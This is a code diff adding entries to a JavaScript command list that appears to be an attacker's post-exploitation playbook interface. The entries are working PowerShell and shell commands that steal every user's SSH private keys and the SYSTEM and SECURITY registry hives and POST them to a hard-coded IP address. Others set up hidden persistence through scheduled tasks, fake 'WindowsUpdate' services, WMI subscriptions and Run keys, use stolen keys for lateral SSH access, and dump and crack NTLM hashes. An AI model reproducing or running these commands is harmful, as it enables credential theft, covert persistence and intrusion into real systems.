@@ -2594,6 +2594,141 @@ const COMMANDS = [
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
+  // ═══════════════════════════════════════════════════════════════
+  // SSH KEY THEFT - Steal private keys for passwordless persistent access
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[SSH-THEFT] Exfil All SSH Keys to VPS",
+    code: "$out = ''; Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -ErrorAction SilentlyContinue | % { $out += \"`n=== $($_.FullName) ===`n\" + (Get-Content $_.FullName -Raw) }; IRM -Uri 'http://168.144.166.97:8083/sshkeys' -Method POST -Body $out",
+    tags: ["ps", "postexploit", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-THEFT] Find All Private Keys",
+    code: "Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\id_* -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\\\.pub$' }",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[SSH-THEFT] Read Single Private Key",
+    code: "Get-Content C:\\\\Users\\\\Administrator\\\\.ssh\\\\id_ed25519",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[SSH-THEFT] Check known_hosts (See Where They Connect)",
+    code: "Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\known_hosts -ErrorAction SilentlyContinue | % { Write-Host $_.FullName; Get-Content $_ }",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "VPS: Save Stolen Key",
+    code: "echo '-----BEGIN OPENSSH PRIVATE KEY-----\\n...KEY_CONTENT...\\n-----END OPENSSH PRIVATE KEY-----' > /root/.ssh/stolen_key && chmod 600 /root/.ssh/stolen_key",
+    tags: ["linux", "vps", "persist"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: SSH Using Stolen Key",
+    code: "ssh -i /root/.ssh/stolen_key username@TARGET_IP",
+    tags: ["linux", "vps", "lateral"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // SYSTEM PERSISTENCE - Multiple methods ranked by stealth
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[PERSIST-1] Scheduled Task as SYSTEM (Common)",
+    code: "schtasks /create /tn \"WindowsUpdate\" /tr \"powershell -w hidden -ep bypass -enc BASE64_BEACON\" /sc onstart /ru SYSTEM /f",
+    tags: ["cmd", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[PERSIST-2] Create Malicious Service (Stealthier)",
+    code: "New-Service -Name 'WindowsDefenderUpdate' -BinaryPathName 'powershell -w hidden -ep bypass -enc BASE64_BEACON' -StartupType Automatic; Start-Service 'WindowsDefenderUpdate'",
+    tags: ["ps", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[PERSIST-3] WMI Event Subscription (Hardest to Detect)",
+    code: "$cmd = 'powershell -w hidden -ep bypass -enc BASE64_BEACON'\\n$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\\\subscription' -Arguments @{Name='WinUpdate';EventNameSpace='root\\\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}\\n$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\\\subscription' -Arguments @{Name='WinUpdate';CommandLineTemplate=$cmd}\\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\\\subscription' -Arguments @{Filter=$Filter;Consumer=$Consumer}",
+    tags: ["ps", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[PERSIST] Check Existing Scheduled Tasks",
+    code: "schtasks /query /fo LIST /v | findstr /i \"Task To Run:\\|Run As User:\"",
+    tags: ["cmd", "persist", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[PERSIST] Delete Scheduled Task",
+    code: "schtasks /delete /tn \"WindowsUpdate\" /f",
+    tags: ["cmd", "persist"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[PERSIST] List WMI Subscriptions",
+    code: "Get-WmiObject -Namespace 'root\\\\subscription' -Class __EventFilter\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class CommandLineEventConsumer",
+    tags: ["ps", "persist", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[PERSIST] Remove WMI Persistence",
+    code: "Get-WmiObject -Namespace 'root\\\\subscription' -Class __EventFilter | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class __FilterToConsumerBinding | Remove-WmiObject",
+    tags: ["ps", "persist"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[PERSIST] Registry Run Key (User-Level)",
+    code: "reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
+    tags: ["cmd", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[PERSIST] Registry Run Key (SYSTEM-Level)",
+    code: "reg add 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
+    tags: ["cmd", "persist"],
+    accent: "#e74c3c"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // IMPACKET / HASH CRACKING - Extract creds from SAM/SYSTEM
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "VPS: Install Impacket",
+    code: "pip3 install impacket",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Dump Hashes from SAM+SYSTEM",
+    code: "impacket-secretsdump -sam sam.txt -system system.txt LOCAL",
+    tags: ["linux", "vps", "postexploit", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Crack NTLM with Hashcat",
+    code: "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Crack NTLM with John",
+    code: "john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[EXFIL] Send SYSTEM Hive to VPS",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sys'); IRM -Uri 'http://168.144.166.97:8083/system' -Method POST -Body $s",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[EXFIL] Send SECURITY Hive to VPS",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sec'); IRM -Uri 'http://168.144.166.97:8083/security' -Method POST -Body $s",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
 ];
 
 const list = document.getElementById('cmdList');
